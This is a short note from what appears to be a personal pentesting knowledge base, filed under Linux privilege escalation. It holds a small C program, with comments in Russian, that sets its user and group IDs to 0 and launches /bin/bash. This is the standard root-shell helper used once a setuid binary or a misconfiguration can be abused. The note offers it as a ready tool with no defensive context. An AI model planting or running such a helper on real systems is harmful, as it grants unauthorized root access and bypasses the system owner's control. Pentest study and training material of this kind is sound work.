[[Linux]] [[Privilege Escalation Linux]]
1 script for Linux on C to be root
```c
#include <stdio.h>
#include <stdlib.h>   // для system()
#include <unistd.h>   // для setuid() и setgid()

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
